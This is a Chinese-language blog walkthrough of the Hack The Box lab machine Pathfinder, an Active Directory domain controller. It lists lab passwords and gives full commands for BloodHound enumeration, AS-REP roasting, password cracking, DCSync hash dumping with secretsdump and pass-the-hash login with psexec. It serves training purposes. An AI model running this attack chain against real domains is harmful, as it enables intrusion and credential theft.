@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hackthebox-Pathfinder - F0rmat&#39;Blog</title>
+<link rel="stylesheet" type="text/css" href="/css/main.css">
+</head>
+<body>
+<header>
+  <div>
+    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
+  </div>
+  <nav></nav>
+</header>
+<main>
+  <article>
+    <div class="title">
+  <h1>Hackthebox-Pathfinder</h1>
+  </div>
+<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">
+<div class="container text-center mt-3">
+    <iframe src="https://duckduckgo.com/search.html?site=https://getshe11.com/&prefill=" style="overflow:hidden;margin:0;padding:0;max-width:80%;height:40px;" frameborder="0"></iframe>
+</div>
+</div>
+<div class="meta">
+  <div>2020-12-19 00:20</div>
+  <div>
+    <span><a href="https://getshe11.com/tags/hackthebox/">#hackthebox</a></span>
+      </div>
+  </div>
+<div class="content">
+  <h1 id="0x00-前言">0x00 前言</h1>
+<p>前面的所有密码：</p>
+<ul>
+<li>
+<p>Archetype：</p>
+<p>Mssql:M3g4c0rp123</p>
+<p>Administrator:MEGACORP_4dm1n!!</p>
+</li>
+<li>
+<p>Oopsie</p>
+<p>Mysql:M3g3C0rpUs3r!</p>
+<p>ftp:mc@F1l3ZilL4</p>
+</li>
+<li>
+<p>Vaccine</p>
+<p>Zip:741852963</p>
+<p>Web:qwerty789</p>
+<p>postgres:P@s5w0rd!</p>
+</li>
+<li>
+<p>Shield</p>
+<p>domain：Sandra：Password1234!</p>
+</li>
+</ul>
+<h1 id="0x01-过程">0x01 过程</h1>
+<h2 id="1信息收集">1、信息收集</h2>
+<p>nmap收集信息：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/1.png" alt="1"></p>
+<p>可以看到开放了88（kerberos）、389（ldap）、3268（全局编录端口），可以判断着一台可能是域控（Domain controller）。</p>
+<!-- raw HTML omitted -->
+<p>既然在上一台靶机获得了域用户的账号密码，那就用来登陆这一台主机看看，首先用的是Psexec工具，在kali上面Impacket工具已经包含了这个脚本Psexec.py</p>
+<p>语法是：</p>
+<p><code>psexec.py [[domain/] username [: password] @] [Target IP Address]</code></p>
+<p>很奇怪，登陆了居然是system，那下面就不用打下去了～</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/2.png" alt="2"></p>
+<p>应该是共享靶机的问题吧，那先按正常流程走一遍，之前我也用这种方式登陆过，但是也出现了认证的错误。</p>
+<p>遇到域我已经大半年没有搞过技术了，有点生疏，顺便复习了一遍，写了一篇笔记：
+<a href="https://getshe11.com/2020/12/16/Domain-security/">https://getshe11.com/2020/12/16/Domain-security/</a></p>
+<p>我看了walkthrough里面一开始就使用bloodhound去枚举域信息，收集域信息，看下有哪些账户是存在配置缺陷之类的，想了解一下bloodhound是什么可以看官方文档：
+<a href="https://bloodhound.readthedocs.io/en/latest/index.html">https://bloodhound.readthedocs.io/en/latest/index.html</a></p>
+<p>安装地址：
+<a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></p>
+<p>为什么要用python版本的bloodhound？因为我们直接用psexec是登陆不上去的，而且也没有开3389端口，也就你无法放exe和ps1的脚本放上去执行</p>
+<p>GitHub主页也没什么使用方法，直接命令-h查看参数：</p>
+<pre><code>usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
+                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
+                         [--dns-tcp] [-d DOMAIN] [-dc HOST] [-gc HOST]
+                         [-w WORKERS] [-v] [--disable-pooling]
+
+Python based ingestor for BloodHound
+For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD//这个参数是指定收集的信息，默认是全部都收集
+                        Which information to collect. Supported: Group,
+                        LocalAdmin, Session, Trusts, Default (all previous),
+                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
+                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
+                        You can specify more than one by separating them with
+                        a comma. (default: Default)
+  -u USERNAME, --username USERNAME //用户名
+                        Username. Format: username[@domain]; If the domain is
+                        unspecified, the current domain is used.
+  -p PASSWORD, --password PASSWORD //密码
+                        Password
+  -k, --kerberos        Use kerberos //本机已有凭证可使用该函数
+  --hashes HASHES       LM:NLTM hashes// 使用NLTM进行登陆
+  -ns NAMESERVER, --nameserver NAMESERVER //指定DNS服务器
+                        Alternative name server to use for queries
+  --dns-tcp             Use TCP instead of UDP for DNS queries //使用tcp
+  -d DOMAIN, --domain DOMAIN //指定域
+                        Domain to query.
+  -dc HOST, --domain-controller HOST //指定域控服务器
+                        Override which DC to query (hostname)
+  -gc HOST, --global-catalog HOST //指定全局编录服务器
+                        Override which GC to query (hostname)
+  -w WORKERS, --workers WORKERS //指定工作组
+                        Number of workers for computer enumeration (default:
+                        10)
+  -v                    Enable verbose output //详细信息输出
+  --disable-pooling     Don't use subprocesses for ACL parsing (only for
+                        debugging purposes)
+</code></pre><p>官方抛出一天命令来收集信息：</p>
+<pre><code>bloodhound-python -d megacorp.local -u sandra -p &quot;Password1234!&quot; -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
+</code></pre><ul>
+<li>
+<p>-d megacorp.local //这里的域怎么得来？</p>
+<p>1.在Shield靶机上面查询得知2.nmap扫描的时候看到运行3268端口和389都有域信息输出</p>
+</li>
+<li>
+<p>-u sandra -p &ldquo;Password1234!&rdquo; //在Shield靶机获取到的域用户</p>
+</li>
+<li>
+<p>-gc pathfinder.megacorp.local // pathfinder主机名怎么得来？</p>
+<p>1.在Shield靶机执行mimikatz上面得知Logon Server：PATHFINDER</p>
+<p>2.这个参数有什么用？可以在官方查询：
+<a href="https://docs.microsoft.com/en-us/windows/win32/ad/global-catalog">https://docs.microsoft.com/en-us/windows/win32/ad/global-catalog</a> 资料得知是全局编录服务器，还可以阅读下AD域服务的文章：
+<a href="https://www.secpulse.com/archives/82876.html">https://www.secpulse.com/archives/82876.html</a>
+意思就是说：指定GC服务器就不需要花更多的时间去域林中搜索对象所在的域，加快枚举的速度,可以连接到3268端口进行枚举</p>
+<p><a href="https://github.com/fox-it/BloodHound.py/blob/fd793b94d6e3a4238c5451ab76915bce59ae5ed0/bloodhound/ad/authentication.py#L46">https://github.com/fox-it/BloodHound.py/blob/fd793b94d6e3a4238c5451ab76915bce59ae5ed0/bloodhound/ad/authentication.py#L46</a></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/5.png" alt="5"></p>
+</li>
+<li>
+<p>-c all //收集全部信息</p>
+</li>
+<li>
+<p>-ns 10.10.10.30 //指定DNS解析服务器</p>
+</li>
+</ul>
+<p>建议在晚上收集，因为白天网络实在太卡了。。之前执行的命令窗口找不到了，用官方的图代替一下：
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/3.webp" alt="3"></p>
+<p>bloodhound.py是采集器，bloodhound工作是需要neo4j数据库，使用以下命令安装：</p>
+<pre><code>apt install neo4j
+apt install bloodhound
+</code></pre><p>启动neo4j：</p>
+<pre><code>neo4j start console
+</code></pre><p>因为首次登陆需要重新设置密码，打开http://localhost:7474/</p>
+<p>初始密码是neo4j:neo4j</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/4.png" alt="4"></p>
+<p>修改完密码后打开bloodhound：</p>
+<pre><code>bloodhound --no-sandbox
+</code></pre><p>输入刚才更改的密码：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/6.png" alt="6"></p>
+<p>按旁边的upload data上传刚才bloodhound.py收集到的4个文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/7.png" alt="7"></p>
+<p>查询参数,可以参考文章学习：
+<a href="https://eviladan0s.github.io/2020/06/04/bloodhound-learn/">https://eviladan0s.github.io/2020/06/04/bloodhound-learn/</a></p>
+<pre><code>Find all Domain Admins                                查找所有域管理员
+Find Shortest Paths to Domain Admins                  查找域管理员的最短路径
+Find Principals with DCSync Rights                    查找具有DCSync权限的主体
+Users with Foreign Domain Group Membership            具有外域组成员身份的用户
+Groups with Foreign Domain Group Membership           具有外域组成员身份的组
+Map Domain Trusts                                     域信任映射图
+Shortest Paths to Unconstrained Delegation Systems    到达无约束委派系统的最短路径
+Shortest Paths from Kerberoastable Users              来自Kerberoastable用户的最短路径
+Shortest Paths to Domain Admins from Kerberoastable Users  可通过Kerberoastable用户访问域管理员的最短路径
+Shortest Path from Owned Principals                   已拥有权限最短路径
+Shortest Paths to Domain Admins from Owned Principals 已拥有权限到域管理员的最短路径
+Shortest Paths to High Value Targets                  高价值目标的最短路径
+List Computers where Domain Users are Local Admin     列出域用户是本地管理员的计算机
+Shortest Paths from Domain Users to High Value Targets 从域用户到高价值目标的最短路径
+Find All Paths from Domain Users to High Value Targets 查找从域用户到高价值目标的所有路径
+Find Workstations where Domain Users can RDP to       查找域用户可以通过RDP到达的工作站
+Find Servers where Domain Users can RDP to            查找域用户可以使用RDP进行访问的服务器
+Find all other Rights Domain Users shouldn’t have     查找所有正常的域用户不应有的权限
+Find Kerberoastable members of High Value Groups      查找高价值用户组的Kerberoastable成员
+List all Kerberoastable Accounts                      列出所有Kerberoastable账户
+Find Kerberoastable Users with most privileges        查找拥有最多特权的Kerberoastable用户
+Find Domain Admin Logons to non-Domain Controllers    查找域管理员登录到非域控制器
+Find unsupported OSs                                  查找不受支持的操作系统
+Find AS-REP Roastable Users (DontReqPreAuth)          查找AS-REP可被破解的用户
+</code></pre><p>这里主要使用Find Principals with DCSync Rights和Find AS-REP Roastable Users (DontReqPreAuth) ：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/8.webp" alt="8"></p>
+<p>1、Find Principals with DCSync Rights</p>
+<p>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash，可以看到SVC_BES域用户对域控是拥有GetcangAll权限，具体原理可以看
+<a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
+和
+<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a></p>
+<p>2、Find AS-REP Roastable Users (DontReqPreAuth)</p>
+<p>查看是否存在AS-REPRoasting漏洞的账户，具体可以看
+<a href="https://getshe11.com/2020/12/16/Domain-security/#AS-REPRoasting">https://getshe11.com/2020/12/16/Domain-security/#AS-REPRoasting</a></p>
+<h2 id="2获取权限">2、获取权限</h2>
+<p>利用刚才存在AS-REPRoasting漏洞的账户获取TGT票据进行解密,使用Impacket里面的GetNPUsers.py，关于Impacket的使用说明可以参考：
+<a href="https://blog.csdn.net/weixin_30877755/article/details/96203724">https://blog.csdn.net/weixin_30877755/article/details/96203724</a></p>
+<pre><code>GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30
+</code></pre><p>借用一下官方图，获取到svc_bes的TGT 票据：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/9.webp" alt="9"></p>
+<p>可以使用hashcat或者John破解,hash是上面获取到的密文：</p>
+<pre><code>john hash -wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre><p>破解出密码：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/10.webp" alt="10"></p>
+<p>接下来官方介绍了一款非常牛逼的工具evil-winrm，其实在一开始我们就可以用这个工具进行操作，上传exe或者poweshell版本的bloodhound，毕竟python版本的bloodhound功能有限，具体用法可以看：
+<a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
+<p>安装与连接：</p>
+<pre><code>gem install evil-winrm
+evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
+</code></pre><h2 id="3提权">3、提权</h2>
+<p>登陆域用户svc_bes后毕竟是没有管理员权限的，我们最终的目标是读取到administrator用户桌面的文件root.txt：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/11.png" alt="11"></p>
+<p>可以使用Impacket里面的secretsdump.py工具导出hash：</p>
+<pre><code>secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/12.webp" alt="12"></p>
+<p>然后使用psexec.py登陆服务器：</p>
+<pre><code>psexec.py megacorp.local/administrator@10.10.10.30 -hashes &lt;NTML hash&gt;:&lt;NTLM hash&gt;
+</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/13.webp" alt="13"></p>
+<p>这里奇怪的是我用Sandra域用户照样可以导出域的全面用户hash：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/14.png" alt="13"></p>
+<p>后来也查了一下这个用户的权限，属于本地管理员还有域用户，太久了不太记得之前是什么权限了，我记得是有些权限它没有的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/15.png" alt="15"></p>
+<h1 id="0x03-总结">0x03 总结</h1>
+<ul>
+<li>
+<p>判断是否开了这三个端口88（kerberos）、389（ldap）、3268（全局编录端口），如果开了是域控的可能性很大</p>
+</li>
+<li>
+<p>psexec工具使用，可以使用hash或者账户密码登陆</p>
+<pre><code>psexec.py [[domain/] username [: password] @] [Target IP Address]
+</code></pre></li>
+<li>
+<p>bloodhound工具使用</p>
+<p>如果已经拿到域用户可以登陆主机上传exe或者ps1的执行收集数据，远程的话可以使用python版本的，但是不是全部收集功能都支持</p>
+</li>
+<li>
+<p>3389登陆问题，我之后拿到域控权限又开启了3389的连接，想登陆用图形界面看下里面的环境配置：</p>
+<p>但发现登陆出现了一下问题：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/16.png" alt="16"></p>
+<p>一开始还以为是rdesktop的问题，后来查资料是没有开这个选项：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Pathfinder/17.webp" alt="17"></p>
+</li>
+<li>
+<p>其他漏洞总结我都写在这一篇里面了：
+<a href="https://getshe11.com/2020/12/16/Domain-security/">https://getshe11.com/2020/12/16/Domain-security/</a></p>
+</li>
+</ul>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x00-%e5%89%8d%e8%a8%80">
+                            0x00 前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x01-%e8%bf%87%e7%a8%8b">
+                            0x01 过程
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#1%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">
+                            1、信息收集
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#2%e8%8e%b7%e5%8f%96%e6%9d%83%e9%99%90">
+                            2、获取权限
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#3%e6%8f%90%e6%9d%83">
+                            3、提权
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x03-%e6%80%bb%e7%bb%93">
+                            0x03 总结
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
